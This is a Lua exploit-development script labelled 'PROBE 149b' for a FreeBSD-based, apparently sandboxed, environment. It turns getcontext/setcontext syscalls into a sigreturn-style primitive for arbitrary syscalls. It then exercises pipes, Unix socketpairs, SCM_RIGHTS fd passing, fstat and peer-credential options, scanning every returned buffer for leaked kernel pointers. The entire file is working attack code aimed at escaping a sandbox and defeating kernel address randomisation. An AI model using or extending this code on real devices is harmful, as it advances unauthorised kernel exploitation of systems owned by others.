-- CRASH_CLASS: LOW
-- PROBE 149b: Fix SCM_RIGHTS alignment + pipe I/O + fd passing kernel leak scan
--
-- 149a: sendmsg/recvmsg worked (1 byte) but cmsg was empty.
-- Root cause: FreeBSD amd64 CMSG_DATA starts at offset 16 (CMSG_ALIGN(12)=16),
-- so cmsg_len=20, CMSG_SPACE=24, fd at +16 not +12.
-- Also: pipe(42) returned 22 in rax (read fd). rdx (write fd) = 23 assumed.

print("=== PROBE 149b: SCM FIX ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local function ga(off)
    return uint64(string.format("0x%X%08X", gh, gl + off))
end

-- [A] Pipe via SROP + I/O using consecutive fds
print("--- [A] PIPE IO ---")
local pr = srop(42)
local prd = pr and to_num(pr) or -1
print("pipe_rax=" .. prd)

if prd >= 0 then
    local pwr = prd + 1
    print("assumed write_fd=" .. pwr)

    -- write(pwr, buf, 8)
    local wbuf = gpu + 0x1000
    wq(wbuf, uint64("0xDEADBEEFCAFEBABE"))
    local wr = srop(4, uint64(pwr), ga(0x1000), uint64(8))
    print("write=" .. (wr and tostring(to_num(wr)) or "nil"))

    -- read(prd, buf, 8)
    local rbuf = gpu + 0x2000
    wq(rbuf, uint64(0))
    local rd = srop(3, uint64(prd), ga(0x2000), uint64(8))
    print("read=" .. (rd and tostring(to_num(rd)) or "nil"))

    local rv = memory.read_qword(rbuf)
    local rvh, rvl = get_hi_lo(rv)
    print("got=0x" .. string.format("%X%08X", rvh, rvl))

    if rvh == 0xDEADBEEF and rvl == 0xCAFEBABE then
        print("*** PIPE WORKS ***")
    end

    -- Close pipe
    srop(6, uint64(prd))
    srop(6, uint64(pwr))
end

-- [B] SCM_RIGHTS with fixed alignment
print("")
print("--- [B] SCM_RIGHTS ---")
local sv = gpu + 0x3000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x3000))
print("socketpair=" .. (sp and tostring(to_num(sp)) or "nil"))

if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))
    print("s0=" .. s0 .. " s1=" .. s1)

    -- Create a test fd (shm object)
    local nm = gpu + 0x4000
    wd(nm, 0x66732F)       -- "/sf"
    wd(nm + 4, 0x00003164) -- "d1\0"
    local test_fd_r = srop(482, ga(0x4000), uint64(0x0202), uint64(0x1B6))
    local test_fd = test_fd_r and to_num(test_fd_r) or -1
    print("test_fd=" .. test_fd)

    if test_fd >= 0 then
        -- FreeBSD amd64 alignment:
        -- sizeof(cmsghdr) = 12
        -- CMSG_ALIGN(12) = 16 (round up to 8-byte boundary)
        -- CMSG_DATA = cmsghdr_ptr + 16
        -- CMSG_LEN(sizeof(int)) = 16 + 4 = 20
        -- CMSG_SPACE(sizeof(int)) = CMSG_ALIGN(16+4) = 24

        -- Build msghdr
        local msghdr = gpu + 0x5000
        local iov = gpu + 0x5100
        local cmsg = gpu + 0x5200
        local iobuf = gpu + 0x5300

        -- IOV: 1 byte
        wd(iobuf, 0x41)
        wq(iov, ga(0x5300))      -- iov_base
        wq(iov + 8, uint64(1))   -- iov_len

        -- CMSG with CORRECT alignment
        -- Clear cmsg area
        for off = 0, 31, 4 do wd(cmsg + off, 0) end
        wd(cmsg + 0, 20)         -- cmsg_len = CMSG_LEN(4) = 20
        wd(cmsg + 4, 0xFFFF)     -- cmsg_level = SOL_SOCKET
        wd(cmsg + 8, 1)          -- cmsg_type = SCM_RIGHTS
        -- padding at +12..+15 (CMSG_ALIGN gap)
        wd(cmsg + 16, test_fd)   -- fd at CMSG_DATA = +16

        -- msghdr
        wq(msghdr + 0x00, uint64(0))  -- msg_name = NULL
        wd(msghdr + 0x08, 0)          -- msg_namelen
        wq(msghdr + 0x10, ga(0x5100)) -- msg_iov
        wd(msghdr + 0x18, 1)          -- msg_iovlen
        wq(msghdr + 0x20, ga(0x5200)) -- msg_control
        wd(msghdr + 0x28, 24)         -- msg_controllen = CMSG_SPACE(4) = 24
        wd(msghdr + 0x30, 0)          -- msg_flags

        -- sendmsg(s0, msghdr, 0) = syscall 28
        local sm = srop(28, uint64(s0), ga(0x5000), uint64(0))
        print("sendmsg=" .. (sm and tostring(to_num(sm)) or "nil"))

        -- Receive side
        local rmsghdr = gpu + 0x6000
        local riov = gpu + 0x6100
        local rcmsg = gpu + 0x6200
        local riobuf = gpu + 0x6300

        wq(riobuf, uint64(0))
        wq(riov, ga(0x6300))
        wq(riov + 8, uint64(64))

        for off = 0, 63, 4 do wd(gpu + 0x6200 + off, 0xCCCCCCCC) end

        wq(rmsghdr + 0x00, uint64(0))
        wd(rmsghdr + 0x08, 0)
        wq(rmsghdr + 0x10, ga(0x6100))
        wd(rmsghdr + 0x18, 1)
        wq(rmsghdr + 0x20, ga(0x6200))
        wd(rmsghdr + 0x28, 64)
        wd(rmsghdr + 0x30, 0)

        -- recvmsg(s1, rmsghdr, 0) = syscall 27
        local rm = srop(27, uint64(s1), ga(0x6000), uint64(0))
        print("recvmsg=" .. (rm and tostring(to_num(rm)) or "nil"))

        -- Check received cmsg
        local rcl = to_num(memory.read_dword(gpu + 0x6200))
        local rlv = to_num(memory.read_dword(gpu + 0x6204))
        local rtp = to_num(memory.read_dword(gpu + 0x6208))
        local rfd = to_num(memory.read_dword(gpu + 0x6210)) -- fd at CMSG_DATA = +16
        print("cmsg_len=" .. rcl .. " level=0x" .. string.format("%X", rlv)
            .. " type=" .. rtp .. " fd_at16=" .. rfd)

        -- Also check +12 in case alignment differs
        local rfd12 = to_num(memory.read_dword(gpu + 0x620C))
        print("fd_at12=" .. rfd12)

        -- Dump first 32 bytes of rcmsg
        print("rcmsg dump:")
        for off = 0, 28, 4 do
            local v = to_num(memory.read_dword(gpu + 0x6200 + off))
            if v ~= 0xCCCCCCCC then
                print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
            end
        end

        -- Check returned msg_controllen
        local rctl = to_num(memory.read_dword(rmsghdr + 0x28))
        print("returned_controllen=" .. rctl)

        -- Check msg_flags
        local rflags = to_num(memory.read_dword(rmsghdr + 0x30))
        print("msg_flags=0x" .. string.format("%X", rflags))

        if rfd > 0 and rfd ~= 0xCCCCCCCC then
            print("*** SCM_RIGHTS WORKS fd=" .. rfd .. " ***")

            -- The received fd is a dup of test_fd in this process
            -- Try fstat on it to see if we can get kernel metadata
            -- fstat = syscall 551 on FreeBSD
            local sbuf = gpu + 0x7000
            for off = 0, 0xFF, 4 do wd(sbuf + off, 0) end
            local fs = srop(551, uint64(rfd), ga(0x7000))
            print("fstat=" .. (fs and tostring(to_num(fs)) or "nil"))

            -- Scan fstat output for kernel pointers
            for off = 0, 0xF8, 8 do
                local ok2, v = pcall(function() return memory.read_qword(sbuf + off) end)
                if ok2 then
                    local h, l = get_hi_lo(v)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print("  *** KPTR stat+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                    end
                end
            end

            srop(6, uint64(rfd))
        elseif rfd12 > 0 and rfd12 ~= 0xCCCCCCCC then
            print("*** SCM_RIGHTS WORKS fd_at12=" .. rfd12 .. " ***")
            srop(6, uint64(rfd12))
        end

        -- Unlink shm
        srop(483, ga(0x4000))
        srop(6, uint64(test_fd))
    end

    -- [C] Send multiple fds at once
    print("")
    print("--- [C] MULTI FD ---")

    -- Create 3 shm fds
    local fds = {}
    for idx = 0, 2 do
        local n = gpu + 0x8000 + idx * 0x10
        wd(n, 0x6D662F)           -- "/fm"
        wd(n + 4, 0x00000030 + idx)
        local f = srop(482, ga(0x8000 + idx * 0x10), uint64(0x0202), uint64(0x1B6))
        fds[idx] = f and to_num(f) or -1
    end
    print("fds=" .. fds[0] .. "," .. fds[1] .. "," .. fds[2])

    if fds[0] >= 0 and fds[1] >= 0 and fds[2] >= 0 then
        -- CMSG with 3 fds:
        -- CMSG_LEN(3*4) = 16 + 12 = 28
        -- CMSG_SPACE(3*4) = CMSG_ALIGN(28) = 32
        local cmsg3 = gpu + 0x9000
        for off = 0, 39, 4 do wd(cmsg3 + off, 0) end
        wd(cmsg3, 28)         -- cmsg_len
        wd(cmsg3 + 4, 0xFFFF) -- SOL_SOCKET
        wd(cmsg3 + 8, 1)      -- SCM_RIGHTS
        wd(cmsg3 + 16, fds[0])
        wd(cmsg3 + 20, fds[1])
        wd(cmsg3 + 24, fds[2])

        local mh3 = gpu + 0xA000
        local iov3 = gpu + 0xA100
        local iobuf3 = gpu + 0xA200
        wd(iobuf3, 0x42)
        wq(iov3, ga(0xA200))
        wq(iov3 + 8, uint64(1))

        wq(mh3 + 0x00, uint64(0))
        wd(mh3 + 0x08, 0)
        wq(mh3 + 0x10, ga(0xA100))
        wd(mh3 + 0x18, 1)
        wq(mh3 + 0x20, ga(0x9000))
        wd(mh3 + 0x28, 32)
        wd(mh3 + 0x30, 0)

        local sm3 = srop(28, uint64(s0), ga(0xA000), uint64(0))
        print("send3=" .. (sm3 and tostring(to_num(sm3)) or "nil"))

        -- Receive
        local rmh3 = gpu + 0xB000
        local riov3 = gpu + 0xB100
        local rcmsg3 = gpu + 0xB200
        local riobuf3 = gpu + 0xB300

        wq(riobuf3, uint64(0))
        wq(riov3, ga(0xB300))
        wq(riov3 + 8, uint64(64))
        for off = 0, 63, 4 do wd(gpu + 0xB200 + off, 0xCCCCCCCC) end

        wq(rmh3 + 0x00, uint64(0))
        wd(rmh3 + 0x08, 0)
        wq(rmh3 + 0x10, ga(0xB100))
        wd(rmh3 + 0x18, 1)
        wq(rmh3 + 0x20, ga(0xB200))
        wd(rmh3 + 0x28, 64)
        wd(rmh3 + 0x30, 0)

        local rm3 = srop(27, uint64(s1), ga(0xB000), uint64(0))
        print("recv3=" .. (rm3 and tostring(to_num(rm3)) or "nil"))

        local rcl3 = to_num(memory.read_dword(gpu + 0xB200))
        local rlv3 = to_num(memory.read_dword(gpu + 0xB204))
        local rtp3 = to_num(memory.read_dword(gpu + 0xB208))
        print("cmsg3: len=" .. rcl3 .. " level=0x" .. string.format("%X", rlv3) .. " type=" .. rtp3)

        -- Dump received cmsg
        for off = 0, 40, 4 do
            local v = to_num(memory.read_dword(gpu + 0xB200 + off))
            if v ~= 0xCCCCCCCC then
                print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
            end
        end

        -- Scan for kernel pointers in cmsg area
        for off = 0, 56, 8 do
            local ok2, v = pcall(function() return memory.read_qword(gpu + 0xB200 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR cmsg+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end
    end

    -- Cleanup
    for idx = 0, 2 do
        if fds[idx] >= 0 then
            srop(6, uint64(fds[idx]))
            srop(483, ga(0x8000 + idx * 0x10))
        end
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [D] getpeername/getsockname on unix socket — kernel pointer leak?
print("")
print("--- [D] SOCKNAME ---")
wq(sv, uint64(0))
local sp2 = srop(135, uint64(1), uint64(1), uint64(0), ga(0x3000))
if sp2 and to_num(sp2) == 0 then
    local d0 = to_num(memory.read_dword(sv))
    local d1 = to_num(memory.read_dword(sv + 4))

    -- getsockname = 32, getpeername = 31
    local saddr = gpu + 0xC000
    local slen = gpu + 0xC100
    for off = 0, 0xFF, 4 do wd(saddr + off, 0xCCCCCCCC) end
    wd(slen, 256)

    local gn = srop(32, uint64(d0), ga(0xC000), ga(0xC100))
    local gnr = gn and to_num(gn) or -1
    print("getsockname=" .. gnr)
    if gnr == 0 then
        local len = to_num(memory.read_dword(slen))
        print("  namelen=" .. len)
        for off = 0, math.min(len, 32) - 1, 4 do
            local v = to_num(memory.read_dword(saddr + off))
            print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
    end

    for off = 0, 0xFF, 4 do wd(saddr + off, 0xCCCCCCCC) end
    wd(slen, 256)
    local gp = srop(31, uint64(d0), ga(0xC000), ga(0xC100))
    local gpr = gp and to_num(gp) or -1
    print("getpeername=" .. gpr)
    if gpr == 0 then
        local len = to_num(memory.read_dword(slen))
        print("  peerlen=" .. len)
        for off = 0, math.min(len, 32) - 1, 4 do
            local v = to_num(memory.read_dword(saddr + off))
            print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
    end

    -- SO_PEERCRED on unix socket — might leak kernel cred pointer
    -- getsockopt(fd, SOL_LOCAL=0, LOCAL_PEERCRED=1, buf, &len)
    -- getsockopt = syscall 118
    local obuf = gpu + 0xD000
    local olen = gpu + 0xD100
    for off = 0, 0x7F, 4 do wd(obuf + off, 0) end
    wd(olen, 128)

    local go = srop(118, uint64(d0), uint64(0), uint64(1), ga(0xD000), ga(0xD100))
    local gor = go and to_num(go) or -1
    print("LOCAL_PEERCRED=" .. gor)
    if gor == 0 then
        local rl = to_num(memory.read_dword(olen))
        print("  len=" .. rl)
        for off = 0, math.min(rl, 64) - 1, 4 do
            local v = to_num(memory.read_dword(obuf + off))
            if v ~= 0 then
                print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
            end
        end
        -- Scan for kernel pointers
        for off = 0, math.min(rl, 64) - 1, 8 do
            local ok2, v = pcall(function() return memory.read_qword(obuf + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("  *** KPTR peercred+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end
    end

    -- LOCAL_CREDS = 2
    for off = 0, 0x7F, 4 do wd(obuf + off, 0) end
    wd(olen, 128)
    -- setsockopt first to enable LOCAL_CREDS
    local one = gpu + 0xD200
    wd(one, 1)
    srop(105, uint64(d1), uint64(0), uint64(2), ga(0xD200), uint64(4))

    -- Send a byte with LOCAL_CREDS enabled
    local byte = gpu + 0xD300
    wd(byte, 0x43)
    srop(4, uint64(d0), ga(0xD300), uint64(1))

    -- Receive with large control buffer
    local rmh = gpu + 0xE000
    local riov = gpu + 0xE100
    local rcm = gpu + 0xE200
    local rio = gpu + 0xE300

    wq(rio, uint64(0))
    wq(riov, ga(0xE300))
    wq(riov + 8, uint64(64))
    for off = 0, 0xFF, 4 do wd(gpu + 0xE200 + off, 0xCCCCCCCC) end

    wq(rmh + 0x00, uint64(0))
    wd(rmh + 0x08, 0)
    wq(rmh + 0x10, ga(0xE100))
    wd(rmh + 0x18, 1)
    wq(rmh + 0x20, ga(0xE200))
    wd(rmh + 0x28, 256)
    wd(rmh + 0x30, 0)

    local rm4 = srop(27, uint64(d1), ga(0xE000), uint64(0))
    print("recv_creds=" .. (rm4 and tostring(to_num(rm4)) or "nil"))

    local rctl = to_num(memory.read_dword(rmh + 0x28))
    print("controllen=" .. rctl)

    -- Dump received creds cmsg
    local modified = 0
    for off = 0, math.min(rctl, 128) - 1, 4 do
        local v = to_num(memory.read_dword(gpu + 0xE200 + off))
        if v ~= 0xCCCCCCCC then
            modified = modified + 1
            if modified <= 16 then
                print("  cred+" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
            end
        end
    end
    print("modified=" .. modified)

    -- Kernel pointer scan in creds
    for off = 0, math.min(rctl, 128) - 1, 8 do
        local ok2, v = pcall(function() return memory.read_qword(gpu + 0xE200 + off) end)
        if ok2 then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  *** KPTR creds+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
            end
        end
    end

    srop(6, uint64(d0))
    srop(6, uint64(d1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
